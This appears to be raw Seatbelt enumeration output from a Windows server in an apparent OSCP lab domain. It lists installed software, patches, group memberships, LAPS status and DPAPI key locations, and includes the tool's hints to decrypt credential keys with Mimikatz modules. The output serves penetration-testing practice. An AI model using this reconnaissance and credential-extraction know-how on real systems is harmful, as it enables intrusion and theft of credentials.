LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
LocalMachine\Root - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
====== ChromiumBookmarks ======

====== ChromiumHistory ======

====== ChromiumPresence ======

====== CloudCredentials ======

====== CloudSyncProviders ======

====== CredEnum ======

ERROR:   [!] Terminating exception running command 'CredEnum': System.ComponentModel.Win32Exception (0x80004005): Element not found
   at Seatbelt.Commands.Windows.CredEnumCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== CredGuard ======

====== dir ======

  LastAccess LastWrite  Size      Path

  24-10-09   24-10-09   0B        C:\Users\Public\Documents\My Music\
  24-10-09   24-10-09   0B        C:\Users\Public\Documents\My Pictures\
  24-10-09   24-10-09   0B        C:\Users\Public\Documents\My Videos\
  24-10-09   24-10-09   0B        C:\Users\Default\Documents\My Music\
  24-10-09   24-10-09   0B        C:\Users\Default\Documents\My Pictures\
  24-10-09   24-10-09   0B        C:\Users\Default\Documents\My Videos\
  24-10-09   24-10-09   0B        C:\Users\b.martin\Documents\My Music\
  24-10-09   24-10-09   0B        C:\Users\b.martin\Documents\My Pictures\
  24-10-09   24-10-09   0B        C:\Users\b.martin\Documents\My Videos\
====== DNSCache ======

  Entry                          : dc20.oscp.exam
  Name                           : DC20.oscp.exam
  Data                           : 172.16.104.200

  Entry                          : dc20.oscp.exam
  Name                           : DC20.oscp.exam
  Data                           : 172.16.104.200

====== DotNet ======

  Installed CLR Versions
      4.0.30319

  Installed .NET Versions
      4.7.03190

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : False
====== DpapiMasterKeys ======

  Folder : C:\Users\b.martin\AppData\Roaming\Microsoft\Protect\S-1-5-21-2481101513-2954867870-2660283483-1104

    LastAccessed              LastModified              FileName
    ------------              ------------              --------
    2/22/2026 8:58:58 AM      2/22/2026 8:58:58 AM      ed417967-371e-49c7-b3c5-3b4694858f09


  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt
  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module
  [*] You can also use SharpDPAPI for masterkey retrieval.
====== Dsregcmd ======

ERROR: Unable to collect. No relevant information were returned
====== EnvironmentPath ======

  Name                           : C:\Program Files\Common Files\Oracle\Java\javapath
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\system32
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\Wbem
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\WindowsPowerShell\v1.0\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\OpenSSH\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\150\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\150\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Users\b.martin\AppData\Local\Microsoft\WindowsApps
  SDDL                           : O:S-1-5-21-2481101513-2954867870-2660283483-1104D:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2481101513-2954867870-2660283483-1104)

====== EnvironmentVariables ======

  <SYSTEM>                           ComSpec                            %SystemRoot%\system32\cmd.exe
  <SYSTEM>                           DriverData                         C:\Windows\System32\Drivers\DriverData
  <SYSTEM>                           OS                                 Windows_NT
  <SYSTEM>                           Path                               C:\Program Files\Common Files\Oracle\Java\javapath;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\
  <SYSTEM>                           PATHEXT                            .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  <SYSTEM>                           PROCESSOR_ARCHITECTURE             AMD64
  <SYSTEM>                           PSModulePath                       %ProgramFiles%\WindowsPowerShell\Modules;%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\
  <SYSTEM>                           TEMP                               %SystemRoot%\TEMP
  <SYSTEM>                           TMP                                %SystemRoot%\TEMP
  <SYSTEM>                           USERNAME                           SYSTEM
  <SYSTEM>                           windir                             %SystemRoot%
  <SYSTEM>                           NUMBER_OF_PROCESSORS               2
  <SYSTEM>                           PROCESSOR_LEVEL                    6
  <SYSTEM>                           PROCESSOR_IDENTIFIER               Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
  <SYSTEM>                           PROCESSOR_REVISION                 4f01
  NT AUTHORITY\SYSTEM                Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  NT AUTHORITY\SYSTEM                TEMP                               %USERPROFILE%\AppData\Local\Temp
  NT AUTHORITY\SYSTEM                TMP                                %USERPROFILE%\AppData\Local\Temp
  OSCP\b.martin                      Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  OSCP\b.martin                      TEMP                               %USERPROFILE%\AppData\Local\Temp
  OSCP\b.martin                      TMP                                %USERPROFILE%\AppData\Local\Temp
====== ExplicitLogonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== ExplorerMRUs ======

====== ExplorerRunCommands ======


  S-1-5-21-2481101513-2954867870-2660283483-1104 :
    a          :  powershell\1
    MRUList    :  cba
    b          :  cmd\1
    c          :  notepad\1
====== FileInfo ======

  Comments                       : 
  CompanyName                    : Microsoft Corporation
  FileDescription                : NT Kernel & System
  FileName                       : C:\Windows\system32\ntoskrnl.exe
  FileVersion                    : 10.0.17763.737 (WinBuild.160101.0800)
  InternalName                   : ntkrnlmp.exe
  IsDebug                        : False
  IsDotNet                       : False
  IsPatched                      : False
  IsPreRelease                   : False
  IsPrivateBuild                 : False
  IsSpecialBuild                 : False
  Language                       : English (United States)
  LegalCopyright                 : c Microsoft Corporation. All rights reserved.
  LegalTrademarks                : 
  OriginalFilename               : ntkrnlmp.exe
  PrivateBuild                   : 
  ProductName                    : Microsoftr Windowsr Operating System
  ProductVersion                 : 10.0.17763.737
  SpecialBuild                   : 
  Attributes                     : Archive
  CreationTimeUtc                : 9/7/2019 12:29:00 AM
  LastAccessTimeUtc              : 9/7/2019 12:29:00 AM
  LastWriteTimeUtc               : 9/7/2019 12:29:00 AM
  Length                         : 9679672
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)

====== FileZilla ======

====== FirefoxHistory ======

====== FirefoxPresence ======

====== Hotfixes ======

Enumerating Windows Hotfixes. For *all* Microsoft updates, use the 'MicrosoftUpdates' command.

  KB4514366  9/7/2019 12:00:00 AM   Update                         
  KB4512577  9/7/2019 12:00:00 AM   Security Update                
  KB4512578  9/7/2019 12:00:00 AM   Security Update                
====== IdleTime ======

  CurrentUser : OSCP\b.martin
  Idletime    : 00h:00m:01s:407ms (1407 milliseconds)

====== IEFavorites ======

Favorites (b.martin):

  http://go.microsoft.com/fwlink/p/?LinkId=255142

====== IETabs ======

====== IEUrls ======

Internet Explorer typed URLs for the last 7 days

====== InstalledProducts ======

  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.32.31326
  DisplayVersion                 : 14.32.31326.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.32.31326
  DisplayVersion                 : 14.32.31326
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Browser for SQL Server 2019
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.32.31326
  DisplayVersion                 : 14.32.31326.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2022 X86 Additional Runtime - 14.32.31326
  DisplayVersion                 : 14.32.31326
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server 2019 (64-bit)
  DisplayVersion                 : 
  Publisher                      : 
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2019 (64-bit)
  DisplayVersion                 : 
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2019 Setup (English)
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Common Files
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 XEvent
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 XEvent
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 SQL Diagnostics
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft VSS Writer for SQL Server 2019
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2019 T-SQL Language Service 
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31326
  DisplayVersion                 : 14.32.31326
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2019 RsFx Driver
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Common Files
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Database Engine Shared
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Shared Management Objects
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft ODBC Driver 17 for SQL Server
  DisplayVersion                 : 17.4.0.1
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 DMF
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Shared Management Objects Extensions
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Connection Info
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft OLE DB Driver for SQL Server
  DisplayVersion                 : 18.2.3.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2012 Native Client 
  DisplayVersion                 : 11.4.7462.6
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : VMware Tools
  DisplayVersion                 : 12.1.0.20219665
  Publisher                      : VMware, Inc.
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Database Engine Services
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Shared Management Objects
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Jenkins 2.440.3
  DisplayVersion                 : 2.255.4403
  Publisher                      : Jenkins Project
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Java(TM) SE Development Kit 21.0.3 (64-bit)
  DisplayVersion                 : 21.0.3.0
  Publisher                      : Oracle Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Shared Management Objects Extensions
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31326
  DisplayVersion                 : 14.32.31326
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Batch Parser
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Database Engine Shared
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Database Engine Services
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 DMF
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Connection Info
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

====== InterestingFiles ======


Accessed      Modified      Path
----------    ----------    -----
====== InterestingProcesses ======

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 6968
    Owner        : OSCP\b.martin
    CommandLine  : "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" 

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 3000
    Owner        : OSCP\b.martin
    CommandLine  : "C:\Windows\system32\cmd.exe" 

    Category     : browser
    Name         : iexplore.exe
    Product      : Microsoft Internet Explorer
    ProcessID    : 6108
    Owner        : OSCP\b.martin
    CommandLine  : "C:\Program Files\internet explorer\iexplore.exe" 

    Category     : browser
    Name         : iexplore.exe
    Product      : Microsoft Internet Explorer
    ProcessID    : 620
    Owner        : OSCP\b.martin
    CommandLine  : "C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:6108 CREDAT:17410 /prefetch:2

====== InternetSettings ======

General Settings
  Hive                               Key : Value

  HKCU          DisableCachingOfSSLPages : 1
  HKCU                IE5_UA_Backup_Flag : 5.0
  HKCU                   PrivacyAdvanced : 1
  HKCU                   SecureProtocols : 2688
  HKCU                        User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU             CertificateRevocation : 1
  HKCU              ZonesSecurityUpgrade : System.Byte[]
  HKCU                WarnonZoneCrossing : 1
  HKCU                   EnableNegotiate : 1
  HKCU                      MigrateProxy : 1
  HKCU                       ProxyEnable : 0
  HKCU                      ActiveXCache : C:\Windows\Downloaded Program Files
  HKCU                CodeBaseSearchPath : CODEBASE
  HKCU                    EnablePunycode : 1
  HKCU                      MinorVersion : 0
  HKCU                    WarnOnIntranet : 1

URLs by Zone
  No URLs configured

Zone Auth Settings
====== KeePass ======

====== LAPS ======

  LAPS Enabled                          : False
  LAPS Admin Account Name               : 
  LAPS Password Complexity              : 
  LAPS Password Length                  : 
  LAPS Expiration Protection Enabled    : 
====== LastShutdown ======

  LastShutdown                   : 10/22/2024 6:54:41 AM

====== LocalGPOs ======

  GPOName                        : Local Group Policy
  GPOType                        : user
  DisplayName                    : Local Group Policy
  Link                           : Local
  FileSysPath                    : C:\Windows\System32\GroupPolicy\User
  Options                        : ALL_SECTIONS_ENABLED
  GPOLink                        : LOCAL_MACHINE
  Extensions                     : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F73-3407-48AE-BA88-E8213C6761F1}]

====== LocalGroups ======

Non-empty Local Groups (and memberships)


  ** SRV22\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)

  User            SRV22\Administrator                      S-1-5-21-318536300-2164503644-2098472648-500
  Group           OSCP\Domain Admins                       S-1-5-21-2481101513-2954867870-2660283483-512
  User            OSCP\c.rogers                            S-1-5-21-2481101513-2954867870-2660283483-1103

  ** SRV22\Guests ** (Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted)

  User            SRV22\Guest                              S-1-5-21-318536300-2164503644-2098472648-501

  ** SRV22\IIS_IUSRS ** (Built-in group used by Internet Information Services.)

  WellKnownGroup  NT AUTHORITY\IUSR                        S-1-5-17

  ** SRV22\Performance Monitor Users ** (Members of this group can access performance counter data locally and remotely)

  WellKnownGroup  NT SERVICE\MSSQLSERVER                   S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
  WellKnownGroup  NT SERVICE\SQLSERVERAGENT                S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430

  ** SRV22\Remote Desktop Users ** (Members in this group are granted the right to logon remotely)

  User            OSCP\b.martin                            S-1-5-21-2481101513-2954867870-2660283483-1104

  ** SRV22\System Managed Accounts Group ** (Members of this group are managed by the system.)

  User            SRV22\DefaultAccount                     S-1-5-21-318536300-2164503644-2098472648-503

  ** SRV22\Users ** (Users are prevented from making accidental or intentional system-wide changes and can run most applications)

  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  WellKnownGroup  NT AUTHORITY\Authenticated Users         S-1-5-11
  Group           OSCP\Domain Users                        S-1-5-21-2481101513-2954867870-2660283483-513
  User            SRV22\jenkins                            S-1-5-21-318536300-2164503644-2098472648-1001

  ** SRV22\SQLServer2005SQLBrowserUser$SRV22 ** (Members in the group have the required access and privileges to be assigned as the log on account for the associated instance of SQL Server Browser.)

  WellKnownGroup  NT SERVICE\SQLBrowser                    S-1-5-80-2488930588-2400869415-1350125619-3751000688-192790804

====== LocalUsers ======

  ComputerName                   : localhost
  UserName                       : Administrator
  Enabled                        : True
  Rid                            : 500
  UserType                       : Administrator
